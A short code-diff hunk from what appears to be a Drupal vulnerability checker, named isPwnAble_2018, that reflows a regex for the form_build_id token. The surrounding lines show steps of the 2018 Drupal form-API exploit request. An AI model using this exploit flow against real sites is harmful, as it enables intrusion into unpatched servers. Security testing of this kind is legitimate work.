@@ -53,7 +53,8 @@ def isPwnAble_2018(host, version, headers):
                               headers=headers, timeout=1)
         except:
             return False
-        m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)"', r.text)
+        m = re.search(r'<input type="hidden" name="form_build_id"'
+                      ' value="([^"]+)"', r.text)
         if m:
             found = m.group(1)
             get_params = {'q': 'file/ajax/name/#value/' + found}
